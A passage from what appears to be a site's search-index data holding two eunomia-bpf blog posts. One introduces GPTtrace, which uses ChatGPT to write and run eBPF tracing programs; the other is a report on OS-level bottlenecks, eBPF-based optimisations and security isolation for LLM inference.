<li>GitHub releases and changelogs for bpftrace, libbpf, and other tools (21: bpftrace/CHANGELOG.md at master - GitHub) (18: Releases \u00b7 libbpf/libbpf - GitHub).</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2023/09/11/use-chatgpt-to-write-ebpf-programs-and-trace-the-linux-kernel-with-natural-language/","title":"Use ChatGPT to write eBPF programs and trace the Linux kernel with natural language","text":"<p>eBPF is a revolutionary technology that originated in the Linux kernel and allows sandboxed programs to run in the kernel of an operating system. It is used to securely and efficiently extend the functionality of the kernel without changing its source code or loading kernel modules. Today, eBPF is widely used in various scenarios: in modern data centers and cloud-native environments, it can provide high-performance network packet processing and load balancing; with very low resource overhead, it enables observability of various fine-grained metrics, helping application developers trace applications and gain insights for performance troubleshooting; it ensures secure execution of applications and container runtimes, and more. eBPF has become an increasingly popular technology that helps us to efficiently trace and analyze almost all applications in the kernel and user space.</p> <p>However, developing eBPF programs or tracing various events generated by the kernel requires certain expertise. For developers unfamiliar with this technology, it can be challenging. In this case, the new ideas brought by our demo tool, GPTtrace, might help you solve this problem. It uses ChatGPT to write eBPF programs and trace the Linux kernel with natural language: https://github.com/eunomia-bpf/GPTtrace</p> <p>If you are a developer who wants to trace and analyze more efficiently, similar solutions are definitely worth trying. The combination of ChatGPT and eBPF technology will play a more important role in future software development, debugging, and observability scenarios, and it may also bring a new interactive learning paradigm.</p>"},{"location":"blog/2023/09/11/use-chatgpt-to-write-ebpf-programs-and-trace-the-linux-kernel-with-natural-language/#what-have-we-tried","title":"What Have We Tried?","text":"<p>GPTtrace uses ChatGPT technology to allow developers to write eBPF programs and trace the Linux kernel in natural language, without the need for prior expertise in this technology. It enables developers to locate and solve software issues more quickly and accurately. For example, to count Page Faults based on process names:</p> <p></p> <p>We also have a video demonstration and explanation which can be viewed here: https://www.bilibili.com/video/BV1oM411J7gp/</p>"},{"location":"blog/2023/09/11/use-chatgpt-to-write-ebpf-programs-and-trace-the-linux-kernel-with-natural-language/#how-did-we-achieve-this","title":"How Did We Achieve This?","text":"<p>Our current approach is to pretrain eBPF programs by having conversations with ChatGPT using various eBPF development materials, teaching ChatGPT how to write different eBPF programs or bpftrace DSL based on the context of the conversation (in fact, we did some similar practice in December and produced a tutorial document, but we didn't turn it into a tool: https://github.com/eunomia-bpf/bpf-developer-tutorial). Here's the rough breakdown:</p> <ol> <li>Pretrain eBPF programs by having conversations with ChatGPT using eBPF development materials to teach ChatGPT how to write different eBPF programs or bpftrace DSL.</li> <li>Call the ChatGPT API and parse the returned result to execute it as a command in the shell or write the eBPF program to a file for compilation and execution.</li> <li>If there are compilation and loading errors, return the corresponding error messages to ChatGPT to generate a new eBPF program or command.</li> </ol> <p>We used the ChatGPT Python API and spent an afternoon implementing this little toy. It can accept natural language descriptions in various languages such as Chinese or English, for example, \"trace open files in a process\" or \"show per-second syscall rates\". The accuracy is not 100%, but out of ten attempts, roughly seven or eight should result in successful tracing. In case of errors, the tool can make corrections and adjustments on its own.</p>"},{"location":"blog/2023/09/11/use-chatgpt-to-write-ebpf-programs-and-trace-the-linux-kernel-with-natural-language/#further-improvements","title":"Further Improvements?","text":"<p>This toy project is intended to demonstrate the possibilities, and there should soon be better APIs like ChatGPT and more general training/execution frameworks available. Hopefully, it will serve as a catalyst for further development. Currently, it seems that there is still plenty of room for improvement:</p> <ol> <li>After enabling internet access, the tool could learn from the example programs in the bcc/bpftrace repository, which would greatly improve its effectiveness.</li> <li>Alternatively, the application itself could search Stack Overflow or similar platforms to query how to write eBPF programs, similar to the new search feature in Bing.</li> <li>Provide more high-quality documentation and tutorials, as the accuracy of the output is closely related to the quality of the tutorials and code examples.</li> <li>It is also possible to invoke other tools multiple times to execute commands, for example, using ChatGPT to output a command, querying the current kernel version and supported tracepoints using bpftrace, and returning the output (this is another conversation), followed by providing a program. This should yield much better results.Short-term, we hope to try building an interactive, informative kernel tracing tool and an eBPF program learning tutorial based on this tool. This will help users quickly understand the syntax and debug errors when writing eBPF programs, and adjust the quality of prompts and suggestions based on user feedback. We also aim to provide a structured tutorial for learning eBPF programming, starting from basic syntax and APIs, and gradually introducing common eBPF application scenarios and writing techniques based on the requirements of the final eBPF program the user wants to write.</li> </ol> <p>In a sense, it might not even be just a language model. With the interactive mode of simple conversations and the ability to manipulate various tools and access the internet, it might serve as a huge and unprecedented knowledge base: connecting various professions, providing comprehensive summaries and thoughts that cannot be easily obtained through search engines based on natural language inputs.</p> <p>In the era of information explosion, we can easily access massive amounts of information, but this also brings another problem, which is the dispersion and fragmentation of information, making it difficult to integrate this information into valuable knowledge. However, ChatGPT can integrate various information and knowledge through natural language interactions, even actively acquire knowledge and receive feedback (just like we did in GPTtrace), forming a huge knowledge base that provides comprehensive thoughts and answers to people.</p> <p>This approach can connect various professions without being limited to specific fields or industries, and provide more accurate and comprehensive summaries based on natural language inputs. Additionally, since ChatGPT can manipulate various tools and access the internet, it can have a deeper understanding of various knowledge and information, and provide users with more comprehensive and in-depth answers.</p> <p>This revolutionary change may already be on the eve of a transformation in human civilization. The way we acquire knowledge and thoughts will be disrupted, and the emergence of similar large-scale models will be an important driving force behind this transformation.</p>"},{"location":"blog/2023/09/11/use-chatgpt-to-write-ebpf-programs-and-trace-the-linux-kernel-with-natural-language/#what-does-the-future-hold","title":"What does the future hold?","text":"<p>In fact, the performance of this model itself is not amazing, and there is still a lot of room for improvement. For someone like me who is not an AI professional researcher (a consumer of AI tools and models), compared to the traditional way of training deep learning models:</p> <ul> <li>Training models do not require organizing and cleaning datasets, only a few high-quality documents and tutorials are needed, in very small quantities, described in natural language; greatly reducing the preparation work for non-professionals.</li> <li>Training can be done intuitively and conveniently with just the conversation context, and anyone can easily understand (or try to analogize) how AI learns.</li> <li>It can adapt to many different tasks in various fields, as long as any task can be converted into a piece of text or command.</li> </ul> <p>As Mr. Che Wanxiang from Harbin Institute of Technology mentioned in the Qingyuan Workshop, in the ChatGPT era, the dangers and opportunities for NLPers are as follows:</p> <p>In the era of ChatGPT, to cope with current challenges, researchers in the field of natural language can learn from information retrieval researchers' experiences. Firstly, academia may no longer conduct systematic research, but mainly focus on relatively marginal research directions; secondly, experiments using data provided by industrial giants may not necessarily yield reliable conclusions, as there are doubts about the authenticity of data due to privacy concerns; conducting research by calling APIs provided by companies may lead to changes in conclusions once the model is adjusted.</p> <p>When the threshold for using AI to solve specific problems becomes low enough, it becomes an enormous opportunity for AI to further popularize and solve problems in more specific scenarios. On the other hand, it may also be the support for AI's infrastructure: when the cost of generating content (such as code, text, algorithms, audio, and video) becomes cheaper, programmable and low-code platforms may become more scalable and reusable compared to the previous huge monolithic applications. For example, directly generating a FaaS interface from a description or interactive dialogue, directly generating a web front-end and deploying it, or using the code generated by ChatGPT as an observable collection and data processing program, deployed to a large-scale observability platform.</p> <p>We are also exploring some compilation toolchains and runtimes that combine eBPF and Wasm, with the aim of achieving programmable extensions from kernel space to user space: https://github.com/eunomia-bpf/wasm-bpf</p>"},{"location":"blog/2023/09/11/use-chatgpt-to-write-ebpf-programs-and-trace-the-linux-kernel-with-natural-language/#some-reference-links","title":"Some reference links","text":"<ul> <li>ChatGPT: https://chat.openai.com/chat</li> <li>GPTtrace: https://github.com/eunomia-bpf/GPTtrace</li> <li>ChatGPT Python API: https://github.com/mmabrouk/chatgpt-wrapper</li> <li>eBPF Developer Tutorial Based on CO-RE (Write Once, Run Everywhere) libbpf: Learn eBPF step by step through 20 small tools (trying to teach ChatGPT to write eBPF programs): https://github.com/eunomia-bpf/bpf-developer-tutorial</li> <li>How ChatGPT-like tools achieve \"strikes\" | A summary of discussions on closed-door seminars on chatbots: https://mp.weixin.qq.com/s/fB9rguy26ej-alm7l_i8iQ</li> <li>eunomia-bpf Open Source Community: https://github.com/eunomia-bpf</li> </ul> <p>Note: This article was written with the help of ChatGPT.</p> <p>Share on  Share on </p>"},{"location":"blog/2025/02/18/os-level-challenges-in-llm-inference-and-optimizations/","title":"OS-Level Challenges in LLM Inference and Optimizations","text":"<p>Large Language Model (LLM) inference pushes computing systems to their limits, not only in raw compute but also in how the operating system (OS) manages resources. This report examines OS-level challenges for LLM inference and explores potential solutions. We focus first on key bottlenecks \u2013 memory management, CPU scheduling, I/O, and real-time constraints \u2013 then discuss how kernel-level techniques (like eBPF and custom scheduling) can address these issues. We also consider the impact of system calls and page faults on performance, security/isolation concerns in multi-tenant environments, best practices and emerging research in OS customization for AI, and practical considerations for implementing such optimizations in a research project. The goal is to guide a research initiative by outlining the challenges and then potential solutions and areas for further investigation.</p>"},{"location":"blog/2025/02/18/os-level-challenges-in-llm-inference-and-optimizations/#os-level-bottlenecks-in-llm-inference","title":"OS-Level Bottlenecks in LLM Inference","text":"<p>LLM inference workloads strain various aspects of an OS. Key bottlenecks include memory management, CPU scheduling, I/O handling, and the need for real-time responsiveness. These factors can become limiting performance factors as models and workloads scale:</p> <ul> <li> <p>Memory Management Challenges: Modern LLMs often have tens of billions of parameters, requiring many gigabytes of memory for model weights and intermediate data. Ensuring sufficient and efficient memory usage is a major challenge. If a model does not fully fit in GPU memory, a common approach is to spill data to CPU RAM or disk \u2013 but traditional GPU\u2013CPU memory swapping incurs high latency and low throughput (1). Even when fitting in RAM, the sheer size of models means managing memory is non-trivial; LLM inference memory footprints continue to grow with larger models and longer context lengths (1). Page faults and swapping (if the OS has to page out model data) can stall inference for milliseconds at a time. The OS\u2019s default paging might not be ideal for LLMs\u2019 access patterns, leading to thrashing or suboptimal use of caches. Large models also benefit from large, contiguous memory allocations, but standard allocation can lead to fragmentation. In short, efficient memory management for LLM inference remains a challenge (1: Pie: Pooling CPU Memory for LLM Inference), and memory bottlenecks can severely hurt latency and throughput if not handled carefully.</p> </li> <li> <p>CPU Scheduling and Compute Jitter: LLM inference (especially on CPUs or when coordinating CPUs and accelerators) can suffer from OS scheduling overhead or \u201cjitter.\u201d The OS\u2019s task scheduler may preempt or context-switch inference threads, introducing variability in latency. Background daemons, interrupts, or other processes on a shared system can interrupt an inference task unexpectedly. In high-performance scenarios, these interruptions cause OS noise that lengthens tail latencies and breaks real-time constraints. For example, measurements in a high-performance setting showed that without special tuning, one in 100 events could be delayed by over 2 milliseconds due to OS scheduling effects, and worst-case delays reached 11 ms (2) (2). By contrast, pinning inference threads to dedicated CPU cores and isolating them from normal scheduling can dramatically reduce latency jitter \u2013 bringing worst-case latency down to tens of microseconds (2: Strategy: Taming Linux Scheduler Jitter Using CPU Isolation and Thread\u00a0Affinity - High Scalability -). This illustrates how significant the default scheduler\u2019s overhead can be. For LLM services that need interactive response times (e.g. chatbots), such variability is problematic. The OS\u2019s general-purpose scheduling (e.g. Linux\u2019s CFS) doesn\u2019t inherently prioritize real-time inference deadlines, so without adaptation, inference requests might queue behind less critical tasks. Ensuring CPU core affinity, using real-time scheduling policies, and preventing frequency scaling or power-saving-induced delays are often necessary to avoid unpredictable slowdowns.</p> </li> <li> <p>I/O and Data Handling Bottlenecks: Although LLM inference is primarily compute-heavy, I/O can become a bottleneck in several ways. First, loading a large model from storage can take significant time (several seconds for multi-GB models) \u2013 if the OS doesn\u2019t efficiently cache or prefetch model weights, startup or context-switching between models is slow. During inference, if the model or its parameters are memory-mapped from disk, any page fault to load data will incur disk I/O latency. Page faults on missing pages cause the OS to pause the process and fetch data from disk (or across PCIe from CPU memory to GPU memory in unified memory scenarios), leading to significant delays (3: Impact of Memory Allocation on Model Latency in TensorRT) (4). The pattern of memory access matters: irregular or random access to model weights can generate many small page faults that saturate I/O channels and degrade throughput (4). Furthermore, reading input data (for example, large text prompts or data batches) and writing outputs (streaming generated tokens to a socket) also involve OS I/O operations and system calls. If not managed, these can queue behind other I/O or suffer from kernel overhead. High-throughput inference servers must optimize how they read inputs and deliver outputs to avoid I/O becoming the slowest link. In summary, while raw computation is often the focus, the OS\u2019s I/O subsystem (file system, disk, network) can limit performance if model data and results aren\u2019t handled in a streaming, efficient manner.</p> </li> <li> <p>Real-Time Constraints and Deadline Misses: Many AI applications have real-time or interactive latency requirements \u2013 for instance, responding to a user query within a few hundred milliseconds. The OS is not traditionally designed for strict real-time guarantees on complex workloads like LLMs. The aforementioned scheduling jitter and I/O unpredictability mean an inference might occasionally take much longer than average, violating service-level objectives. Unlike a purpose-built real-time system, a general OS might schedule an unrelated background job or handle an interrupt (e.g. a network packet, or a disk flush) in the middle of an inference computation, adding unforeseen delay. Additionally, interrupt handling and kernel timers can preempt running threads at inopportune moments. Without special configuration, these sources of latency variation can derail an otherwise fast model. For instance, periodic OS housekeeping tasks or device interrupts contribute to OS noise, which HPC studies have long identified as a problem for time-sensitive workloads (5: Meet osnoise, a better tool for fine-tuning to reduce operating system ...) ([PDF] Shoot first and stop the OS noise - The Linux Kernel Archives). In an LLM serving context, \u201creal-time\u201d means consistently low latency per token generation or request; to approach this, practitioners often isolate CPUs, elevate thread priorities, and disable certain OS services on inference machines. The challenge is balancing a responsive system with the isolation required for deterministic performance.</p> </li> </ul> <p>Why the OS Matters: These bottlenecks highlight that an OS not tuned for AI can become the performance limiter. Modern accelerators (GPUs, TPUs) are extremely fast at matrix computations, so the relative overhead of OS activities (memory paging, scheduling, syscalls) becomes more pronounced. Indeed, as one analysis notes, tasks like scheduling that were once negligible can now consume a significant fraction of inference time given the speed of optimized LLM kernels (6) (6). Similarly, context-switches and kernel-user mode transitions disrupt the execution flow, causing cache flushes and pipeline stalls that inflate latency and reduce throughput (7) (7). Overall, treating the OS as an integral part of the AI inference stack \u2013 not just an invisible layer \u2013 is crucial. Next, we explore solutions at the OS level, including customizing the kernel behavior, to alleviate these challenges.</p>"},{"location":"blog/2025/02/18/os-level-challenges-in-llm-inference-and-optimizations/#custom-kernel-extensions-and-ebpf-for-ai-workloads","title":"Custom Kernel Extensions and eBPF for AI Workloads","text":"<p>To address OS-level bottlenecks, researchers and engineers are increasingly turning to custom kernel programming and eBPF (extended Berkeley Packet Filter) technology. These allow tailoring or extending OS behavior for specific workload needs \u2013 without reinventing a whole OS from scratch. Below, we discuss how kernel customizations can target the bottlenecks identified, and how eBPF in particular provides a flexible toolset for optimizing LLM inference in the OS.</p> <ul> <li> <p>Optimizing Scheduling with eBPF and Custom Policies: One of the most direct OS-level optimizations is customizing how the CPU scheduler treats AI inference tasks. Rather than relying solely on the default scheduler, frameworks like Google\u2019s ghOSt provide an API for controlling Linux scheduling from user-space processes or eBPF programs (8). In ghOSt, one can implement custom scheduling policies (even the entire scheduler logic) at the user level, or use eBPF hooks in the kernel to intercept scheduling events. This means an AI-serving system could, for example, ensure that an LLM inference thread is never preempted during critical sections, or that it gets priority on specific cores. Ghost allows multiple \u201cagents\u201d (which can be user-space daemons or eBPF programs) to influence kernel scheduling decisions in a coordinated way (8). By fine-tuning time slices, core affinities, or load balancing decisions via such mechanisms, the scheduler can be taught to favor AI workloads under certain conditions (for instance, reserving cores for inference only, or accelerating wake-ups for latency-critical inference requests). The openEuler Linux distribution recently introduced a programmable scheduling framework based on eBPF, which lets the kernel scheduler dynamically extend its policies to meet different workload performance requirements (9). This kind of eBPF-based scheduling extension can be used to implement AI-specific policies \u2013 for example, making scheduling decisions that minimize interference for a high-QoS (quality of service) AI service. In summary, kernel extensibility via eBPF allows injecting domain-specific knowledge (like LLM throughput vs. latency trade-offs) into scheduling, beyond what a one-size-fits-all OS would normally do.</p> </li> <li> <p>Memory Management and eBPF for Paging/Prefetching: Another fruitful area is using custom kernel code to handle memory paging and prefetching in a smarter way for LLMs. The access pattern of LLM inference (especially if using techniques like memory mapping model weights or swapping between CPU and GPU memory) can be predicted or guided with additional knowledge. eBPF programs can hook into kernel events such as page faults or swapping decisions. For example, an eBPF program could monitor page fault rates on model memory and trigger prefetching of certain pages (or promote them to higher-speed memory) before they are needed. Research prototypes like FetchBPF have used eBPF to implement customizable prefetching policies in Linux ([PDF] FetchBPF: Customizable Prefetching Policies in Linux with eBPF). In the context of AI, one could imagine an eBPF that recognizes when an inference process sequentially scans model layers and proactively faults in the next layer from disk or host memory, avoiding stalls. Similarly, eBPF could be used to implement a smarter swap strategy for GPU memory oversubscription, perhaps by integrating with GPU driver events. (In fact, NVIDIA\u2019s Unified Memory system already does on-demand page migration between host and GPU, but one could complement it with kernel plugins that, say, lock critical pages in GPU memory or batch migrations to amortize overhead.) The key idea is that standard OS paging might be suboptimal for LLMs, but with kernel programming we can tailor it \u2013 whether through eBPF or kernel modules \u2013 to reduce page faults and improve data locality. For instance, using larger page sizes is one known practice: larger pages (hugepages) mean fewer total page faults and TLB misses. This was observed on IBM Power9 systems, where the default 64KB page size moved larger chunks of memory per fault, yielding better throughput than the 4KB pages on x86 (4). A custom kernel could enforce hugepage use for model memory or use transparent huge pages more aggressively. In summary, kernel-level tweaks like custom page fault handlers, prefetchers, or specialized allocators (possibly informed by eBPF-collected metrics) can mitigate memory bottlenecks.</p> </li> <li> <p>Using eBPF for Monitoring and Adaptive Optimization: eBPF isn\u2019t only for direct control; it\u2019s also a powerful observability tool. We can attach eBPF programs to tracepoints or kprobes to gather fine-grained metrics on inference workloads \u2013 without significant overhead or modifying user code. For example, one could trace system calls made by the inference process, measure their latency, or count page fault events in real time. Such data helps identify where the OS is bottlenecking. A research initiative called BPFTime suggests adding LLM-specific observability metrics via eBPF, to collect exactly the information needed to optimize these workloads (10: Possible ideas for the future - eunomia). By gathering metrics on cache misses, context switches, I/O wait times, etc., an intelligent controller (perhaps another eBPF or a user-space agent) could dynamically adjust system parameters. For instance, if eBPF monitoring shows a spike in page faults when a model\u2019s context window grows, the system might decide to lock those pages in memory (using <code>mlock</code> via a syscall) or increase the priority of the disk read-ahead thread. Or if it observes that an inference process is frequently yielding the CPU (e.g. waiting on GPU I/O), an eBPF could temporarily give other tasks more CPU to improve overall utilization, then switch back. This kind of feedback-driven optimization leverages kernel programmability: we can create closed-loop controls where eBPF programs both measure and act upon kernel events relevant to AI performance.</p> </li> <li> <p>Custom Kernel Modules for AI Scheduling and Isolation: Beyond eBPF (which is restricted in complexity by design), full custom kernel modules or patches can be deployed for AI tasks. For example, one might implement a new Linux scheduling class specifically for deep learning inference \u2013 perhaps a variant of the real-time scheduler that time-slices based on inference micro-batches or token generation steps. Modules could also improve isolation: e.g., a kernel module could enforce that an AI process gets exclusive access to certain cores or devices when active, and gracefully relinquishes them when idle. This is akin to how HPC systems use Linux\u2019s <code>cgroups</code> or CPU sets to isolate jobs; a tailored module could do this dynamically in response to load. Another example is modifying the Linux memory manager to be NUMA-aware for model allocations \u2013 ensuring that if a CPU is doing part of the inference, the memory for that task stays on the local NUMA node to reduce access latency. (This yields measurable gains; keeping memory on the same NUMA node as the CPU core can improve performance by 5\u201310% compared to cross-node memory access (11: Optimization Practice of Deep Learning Inference Deployment on Intel\u00ae...).) Some research OSes have even proposed bypassing the kernel altogether for certain operations (user-space networking stacks, user-space drivers, etc.) to avoid kernel overhead. While that\u2019s a broad technique, it can be applied in inference serving: e.g., using user-space I/O (like DPDK for networking) so that outgoing token streams don\u2019t incur kernel context switches.</p> </li> </ul> <p>In summary, kernel-level programming (via eBPF or modules) provides a toolkit to surmount OS bottlenecks. By injecting AI-specific logic into the OS, we can significantly reduce overheads \u2013 scheduling delays, page faults, cache misses \u2013 that general-purpose OSes introduce. The next section will dive deeper into those overheads (system calls, context switches, etc.) and how they manifest in AI inference.</p>"},{"location":"blog/2025/02/18/os-level-challenges-in-llm-inference-and-optimizations/#system-calls-page-faults-and-kerneluser-space-interactions","title":"System Calls, Page Faults, and Kernel\u2013User Space Interactions","text":"<p>Even with an optimized scheduler or memory manager, the boundary between user-space (where the model code runs) and kernel-space (where OS services run) is a critical juncture. System calls, context switches, and page faults each involve crossing that boundary, and each crossing carries performance costs that can impact LLM inference.</p> <ul> <li> <p>System Call Overheads: A system call (such as reading input data, writing output, or allocating memory) switches the CPU from user mode to kernel mode to perform an OS service. This transition is much more expensive than a regular function call \u2013 it may involve saving CPU registers, switching to a kernel stack, invalidating certain CPU state (like memory mappings), and then later restoring everything to resume user code. Modern CPUs and OSes have optimized the path (using techniques like VDSO for certain calls), but it\u2019s still on the order of hundreds or thousands of CPU cycles for each syscall, plus potential cache disruption (7) (7). For an LLM generating thousands of tokens, if each token write uses a syscall (e.g. writing to a socket or file) or if intermediate steps frequently call into the OS (for memory allocation, thread synchronization, etc.), those costs add up. In fact, frequent kernel-user transitions can interfere with the CPU\u2019s instruction pipeline and caches, leading to poor caching behavior and extra latency beyond the direct measured cost of the call (7). For example, waking a thread waiting on I/O involves a syscall (to sleep) and an interrupt (to wake), plus scheduler overhead, and incurs many cache misses along the way (7). In systems with very fast hardware (like NVMe SSDs, 100Gb networks, or GPUs), these context switch overheads become a dominant factor (7). Therefore, minimizing system calls in the hot path of inference is a known best practice. Techniques include using asynchronous I/O (so calls can be batched or handled by the kernel with fewer wake-ups), memory-mapping files (to handle file I/O via page fault rather than explicit read/write calls), and reusing memory buffers (to avoid constant <code>malloc/free</code> calls). The fewer times we jump between user and kernel, the more the CPU can stay busy on actual model computation.</p> </li> <li> <p>Page Faults and Memory Access Overheads: A page fault occurs when a process accesses a virtual memory address that is not currently mapped to physical memory. This triggers a trap into the kernel\u2019s page fault handler. In LLM inference, page faults can happen if the model or data is larger than available RAM (causing parts to be swapped to disk), or when using memory-mapped files (causing on-demand loading), or in GPU unified memory scenarios (triggering data transfer between host and GPU). Page faults are essentially unavoidable cache misses at the OS level \u2013 and they incur huge penalties because accessing disk or even just handling the fault takes orders of magnitude more time than normal memory access. For example, if an LLM model is partially on SSD, a page fault means the OS must fetch that page (4KB or 2MB, etc.) from storage, which could take milliseconds. Even in a GPU oversubscription case, servicing a page fault requires possibly evicting some GPU memory to host, and copying needed data from host to GPU, with many rounds of kernel involvement (4). The pattern of page faults greatly influences performance: if an algorithm causes random page faults all over a large file or memory region, the system will spend more time thrashing pages in and out than doing computation (4) (4: Improving GPU Memory Oversubscription Performance | NVIDIA Technical Blog). Conversely, sequential access patterns allow OS prefetchers to anticipate and load pages ahead of use. For LLM inference, key strategies are to avoid or hide page faults. This can mean using locked memory (preventing critical pages from being swapped out), using huge pages to reduce the number of total pages (thus fewer faults and TLB misses), and aligning data structures with page boundaries to improve locality. It can also involve manually pre-touching pages (e.g. reading through the model once at startup to force it into memory) or using madvise/mmap flags like <code>MAP_POPULATE</code> to have the OS pre-load pages. Another strategy from systems like FlexGen and PagedAttention is to manage model paging at the application level: they carefully orchestrate which parts of the model reside in GPU, CPU, or disk at each step to minimize unplanned page faults. Nonetheless, when page faults do occur, their cost is very high \u2013 one miss can stall a thread for a million cycles or more if it has to go to disk. Therefore, understanding and measuring page fault frequency is important when profiling an inference system; a surprisingly slow throughput might be explained by even occasional faults that break the flow of data.</p> </li> <li> <p>Context Switches and Interrupts: In addition to deliberate syscalls and page faults, the kernel can interrupt a user process due to timer interrupts, hardware interrupts (e.g. network packets arriving), or to schedule another process. Each context switch, even between two user processes/threads, involves saving CPU state and loading another \u2013 which can cost on the order of a few hundred nanoseconds to a few microseconds, plus indirect costs of cache and TLB disturbances (7) (7: A Case Against (Most) Context Switches). In a busy environment, an inference thread might be context-switched out briefly and then resumed, which can disturb the continuity of data in CPU caches. Moreover, if an inference is running on multiple threads or uses GPU (which runs asynchronously), there may be frequent coordination points where one thread waits and another runs, causing context switches. One way to mitigate this is pinning threads to dedicated cores (so the OS ideally never context-switches them out for others, as long as a core per thread is available). Another is increasing the scheduling priority or using real-time scheduling, which reduces the chance of preemption by ordinary tasks. On the flip side, busy-waiting on synchronization (to avoid context switches) can lead to wasted CPU cycles, so a balance is needed. Modern OS kernels also employ techniques like interrupt coalescing (batching interrupts) and tickless kernels (to avoid frequent timer interrupts on idle cores) which can reduce unnecessary context switches. For LLM services, it is often recommended to isolate the CPU cores that run the model from those that handle interrupts or background tasks \u2013 essentially treating them as quasi real-time cores.</p> </li> </ul> <p>In essence, kernel-user interactions are expensive relative to the arithmetic our AI models perform. Every time we cross that boundary, we pay a cost in latency and lost CPU efficiency. A solid understanding of these costs informs why certain optimizations (like avoiding small syscalls in tight loops, or locking memory to avoid paging) can yield significant performance gains in practice. It also underlines why advanced techniques like eBPF or user-space networking exist: they try to eliminate some of these transitions by doing more work in one domain (e.g. handling a packet in kernel via eBPF instead of bouncing to user-space). For a research project, measuring how often and why your inference code enters the kernel (using tools like <code>strace</code>, <code>perf</code>, or eBPF tracepoints) can illuminate non-obvious slowdowns.</p>"},{"location":"blog/2025/02/18/os-level-challenges-in-llm-inference-and-optimizations/#security-and-isolation-in-ai-inference-workloads","title":"Security and Isolation in AI Inference Workloads","text":"<p>When optimizing at the OS level, we must also consider security and isolation, especially as AI inference moves to cloud and multi-tenant environments. LLM inference often involves sensitive data (user queries) and proprietary models, so the OS must isolate workloads from each other and protect the system from any misbehavior of the AI process. Here we outline the main concerns and challenges:</p> <ul> <li> <p>Multi-Tenancy and Isolation: In cloud or shared cluster scenarios, multiple users or applications might run inference on the same physical machine. The primary challenge is to ensure adequate isolation so that one tenant\u2019s workload cannot interfere with or peek into another\u2019s (12: Multi-Tenancy for AI Clusters: Enabling Scalability and Security). This includes isolating compute resources (CPU/GPU time), memory, and I/O bandwidth. The OS typically provides mechanisms like process isolation, cgroups/quotas, and namespacing (in Linux) to separate workloads. However, simply relying on OS process isolation may not be sufficient for performance isolation in AI workloads (). Contention in shared resources (CPU caches, memory bandwidth, disk, network interfaces) can cause one model\u2019s performance to degrade due to another\u2019s activity, even if they are separate processes. Researchers note that \u201cshared systems cannot rely on OS mechanisms for isolation between tenants\u201d alone, and often require additional application-level resource management (). For example, two inference processes sharing a GPU need cooperation beyond what the OS can enforce (since the GPU scheduling might be handled by its driver or hardware). Best practice in multi-tenant AI serving is to use containers or VMs to add stronger isolation boundaries around each model, and to employ scheduling policies that account for the unique needs of each workload (preventing a noisy neighbor from consuming all resources). The OS\u2019s job is then to support these isolation boundaries efficiently.</p> </li> <li> <p>Memory and Data Security: Large models and their intermediate data reside in system memory \u2013 an OS must ensure that one process cannot read or corrupt another process\u2019s memory. This is standard memory protection, which operating systems handle via virtual memory. The concern is if there are any vulnerabilities (e.g., a bug in a custom kernel module or in the GPU driver) that could be exploited to break this isolation. Additionally, when using shared hardware like GPUs, memory isolation is handled by the GPU\u2019s memory management unit and drivers. There have been instances of side-channel attacks on GPUs where one process can infer details about another by measuring timing or resource usage, so high-security environments may demand strict scheduling or even dedicating GPUs to a single tenant at a time. Another vector is swap space or disk cache: if the OS swaps out model memory to disk, that data might persist on disk unless properly encrypted or wiped, creating a risk if the disk is shared or later re-used. Ensuring that sensitive model data doesn\u2019t leak via OS-managed resources is important (for example, using encrypted filesystems for swap, or disabling swapping for confidentiality).</p> </li> <li> <p>System Calls and API Security: An inference server is typically a long-running process that might accept client connections, load model files, etc. This means it will make system calls that interact with the external environment (opening files, reading network sockets). Each of these interactions is a potential security risk \u2013 e.g., malformed input causing a buffer overflow in the model server, or a model file with unexpected format. While these are more application-level, the OS can provide mitigation like seccomp filters to restrict which system calls the process is allowed to make (reducing the impact if the process is compromised). For instance, an inference process likely doesn\u2019t need to call <code>exec()</code> or manipulate system configuration, so a seccomp profile could lock it down to only networking and memory calls. Similarly, Linux capabilities can be dropped (e.g., no permission to load new kernel modules or use raw sockets) to limit what the process can do. If we use eBPF programs to assist the inference, note that loading eBPF requires privileges; care must be taken that only trusted code is run in kernel (the eBPF verifier helps by rejecting unsafe code, but a bug in the verifier could be disastrous).</p> </li> <li> <p>Running as Root vs. Least Privilege: Some OS-level optimizations often are done in privileged context \u2013 for example, setting real-time priorities or locking memory (via <code>mlock</code>) or using hugepages might require root privileges or specific capabilities. From a security standpoint, running the inference service with elevated privileges is risky: if an attacker finds a vulnerability in the model server or the model itself (perhaps through a malicious input designed to cause an overflow in C++ runtime or a Python library), they could gain control of a privileged process, leading to a full system compromise. Therefore, a principle of least privilege is crucial. One practical way to reconcile this is: perform the privileged setup (memory locking, reserving hugepages, setting CPU affinity) at launch time under a controlled context, then drop privileges for the main serving loop. Containerization can help here by giving the container the specific rights it needs (via Linux capabilities) without making it fully root on the host. For research purposes, one might run experiments as root on a test machine (to freely tweak the kernel), but any deployment should carefully sandbox such modifications.</p> </li> <li> <p>Side-Channel and Microarchitectural Security: Although more of a hardware concern, it\u2019s worth noting that certain OS decisions affect side-channel resistance. CPU features like simultaneous multithreading (SMT/Hyper-Threading) can enable side-channel attacks (e.g., cache timing attacks) between threads on the same core. For a highly secure inference environment, one might disable SMT or ensure that two different tenants never share the same physical core (the OS scheduler can enforce this if configured). Similarly, ensuring that the OS is patched for speculative execution vulnerabilities (Spectre, Meltdown) is important, because those could in theory allow inferring data from another process\u2019s memory. Note that many of those patches (like kernel page table isolation) incur performance overhead. There is a trade-off: maximum performance might be achieved by turning off certain security mitigations, but that\u2019s only acceptable in controlled offline environments, not multi-tenant scenarios. A research project should be aware of these trade-offs and at least document them if any OS hardening features are disabled for performance testing.</p> </li> <li> <p>Confidential Computing for Inference: An emerging approach to security is to run AI inference inside trusted execution environments (TEEs) or encrypted VMs to protect data and models even from the host OS itself. For example, Intel SGX or TDX, or AMD SEV, can keep model weights encrypted in memory and only accessible within an enclave. This adds additional OS-level challenges: standard OS memory management might not work the same (enclaves have limited secure memory and page faults in/out of enclaves are extremely costly ([PDF] Memory-Efficient Deep Learning Inference in Trusted Execution ...)), and scheduling an enclave thread has to preserve its security properties. While this is a bit tangential to OS optimization, it\u2019s relevant to mention because a research initiative might consider whether the OS changes they propose are compatible with confidential computing. Running inference in an isolated VM (like AWS Nitro enclaves or similar) could be a way to achieve strong isolation at some performance cost. Container-based isolation is weaker but faster; VM-based isolation (or enclave) is stronger but introduces overhead (additional context switch or encryption cost). Thus, one must balance security needs with performance \u2013 often by running most heavy workloads on bare metal but isolating tenants by giving each their own dedicated hardware 